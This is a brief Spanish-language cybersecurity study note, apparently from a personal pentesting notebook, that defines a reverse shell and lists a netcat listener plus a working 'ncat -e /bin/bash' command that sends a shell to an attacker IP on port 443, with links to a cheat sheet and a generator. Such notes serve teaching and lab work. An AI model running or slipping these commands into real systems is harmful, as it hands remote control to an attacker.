-----------
Tags: #shell #bash #lenguajes #ReverseShell #explotación #explotation

---
# Definición

Una [[Reverse Shell]], también conocida como "shell inversa", es una técnica utilizada en ciberseguridad que permite a un atacante obtener acceso remoto a un sistema comprometido. En este tipo de conexión, es el sistema objetivo el que establece la conexión hacia el atacante, en lugar de que el atacante se conecte directamente al sistema objetivo. Esta metodología es común en ataques de post-explotación y se utiliza para evadir firewalls o otros mecanismos de defensa.

---
# Parámetros y Usos

- La maquina atacante se pone en escucha:
  ```bash
nc -nlvp 443
```

- Desde el servidor se manda una conexión a la ip y el puerto que se ha abierto en la escucha
```bash
ncat -e /bin/bash 172.17.0.1 443
```

![[Reverse Shell.png]]
---------
# Referencias

- **Cheat Sheet** de Reverse Shell: [Enlace](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- **Generador** de Reverse Shell: [Enlace](https://www.revshells.com/)